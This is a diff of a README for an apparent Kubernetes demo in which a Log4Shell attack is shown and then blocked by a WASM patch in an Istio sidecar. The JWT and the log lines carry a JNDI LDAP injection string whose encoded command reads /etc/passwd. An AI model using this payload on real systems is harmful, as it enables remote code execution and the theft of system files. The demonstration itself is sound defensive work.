@@ -126,7 +126,9 @@ demonstrate the attach, let's inject some malicious payloads in the token by set
   eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IkRGRWVyODZqY2lRQTNfUVdETkE3MyJ9.eyJuaWNrbmFtZSI6ImlnbmFzaSt0ZXN0IiwibmFtZSI6IiR7am5kaTpsZGFwOi8vbG9nNHNoZWxsOjEzODkvZXhlYy9ZMkYwSUM5bGRHTXZjR0Z6YzNka0NnPT19IiwicGljdHVyZSI6Imh0dHBzOi8vcy5ncmF2YXRhci5jb20vYXZhdGFyLzA0NGMyNTUwOTg0MTYzYzk5NDc3Y2QzZDJiNjQ1ZWI0P3M9NDgwJnI9cGcmZD1odHRwcyUzQSUyRiUyRmNkbi5hdXRoMC5jb20lMkZhdmF0YXJzJTJGaWcucG5nIiwidXBkYXRlZF9hdCI6IjIwMjItMDEtMjRUMDg6MjM6NDguODY5WiIsImVtYWlsIjoiaWduYXNpK3Rlc3RAdGV0cmF0ZS5pbyIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJpc3MiOiJodHRwczovL25hY3gtZG16LmV1LmF1dGgwLmNvbS8iLCJzdWIiOiJhdXRoMHw2MWU3ZjQ1YTc2ZGMzYTAwNmFhZTUwZGIiLCJhdWQiOiJkeXlXMG1lNExxOG4zdFkzMEZhdHVEUUZYcHRadm00byIsImlhdCI6MTY0MzAxMjYyOSwiZXhwIjoxNjQzMDQ4NjI5LCJub25jZSI6IlQ5c2Q2LTZsNDlNVGRkUXFOLVJkeEplYmMwS1VsNk1OOVJmRWtkMVZVWjgifQ.FUi8ydGHDksc_B6YfmE-xCmSvdfOtroxJ5MOp5aern-JK3Qrcm0lYo4NNcxRdDg65AbS93hklexBRLBzfTd5B8jopiyzqmznMtafxV9rrH_ZS2-oBrfc-soLQf0r9d8T0tTnnidtfAbPSwNyv5zKiFHXxHGHoX-x6wjZahCt-pKk4uoCdTDGgCp2751yXF1FJSLcC8v8kiSC9lZhm7xJxVFvP19zZ30PadD9b_QOu3Xs-yOz2LxCXCXImQZvfuCV2YFOvVGimfKz35WeEf5RAeJZkxoHN6G3oXnbEwgIAdAl6r68Gj2LUbloy8XvKgJk7IIcsSlAwETiiPWdemP3ag
   ```
 * However, if we inspect the application container logs we'll see something like:
-  ```
+  ```bash
+  $ kubectl logs -n zta-demo -l app=vulnerable --tail 30
+
   08:23:49.369 [qtp1316061703-14] INFO  io.tetrate.log4shell.vulnerable.GreetingsServlet - user resolved to: pwned!
   08:23:49.535 [qtp1316061703-16] INFO  io.tetrate.log4shell.vulnerable.GreetingsServlet - token payload: {"sub":"auth0|61e7f45a76dc3a006aae50db","aud":"dyyW0me4Lq8n3tY30FatuDQFXptZvm4o","email_verified":true,"updated_at":"2022-01-24T08:23:48.869Z","nickname":"ignasi+test","name":"${jndi:ldap:\/\/log4shell:1389\/exec\/Y2F0IC9ldGMvcGFzc3dkCg==}","iss":"https:\/\/nacx-dmz.eu.auth0.com\/","exp":1643048629,"iat":1643012629,"nonce":"T9sd6-6l49MTddQqN-RdxJebc0KUl6MN9RfEkd1VUZ8","picture":"https:\/\/s.gravatar.com\/avatar\/044c2550984163c99477cd3d2b645eb4?s=480&r=pg&d=https%3A%2F%2Fcdn.auth0.com%2Favatars%2Fig.png","email":"ignasi+test@tetrate.io"}
   /!\ /!\ /!\ You have been pwned!
@@ -167,7 +169,7 @@ that comes base64-encoded in the payload.
 To prevent this, we will deploy the [WASM patch](wasm-patch) to all the Java applications in the environment:
 
 ```bash
-envsubst < config/wasm-patch.yaml | kubectl apply -f -
+$ envsubst < config/wasm-patch.yaml | kubectl apply -f -
 ```
 
 The [patch file](config/wasm-patch.yaml) sets the `selectors` so that the patch is deployed only to Java applications, and it instructs
@@ -180,7 +182,7 @@ Access Denied
 We can check that the sidecar proxy in the application pod is rejecting hte traffic via the WASM plugin we jsut deployed:
 
 ```bash
-kubectl -n zta-demo logs -l app=vulnerable -c istio-proxy | grep wasm
+$ kubectl -n zta-demo logs -l app=vulnerable -c istio-proxy | grep wasm
 2022-01-24T08:35:18.968121Z	info	envoy wasm	wasm log zta-demo.log4shell-patch: access denied for: ${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}
 ```
 
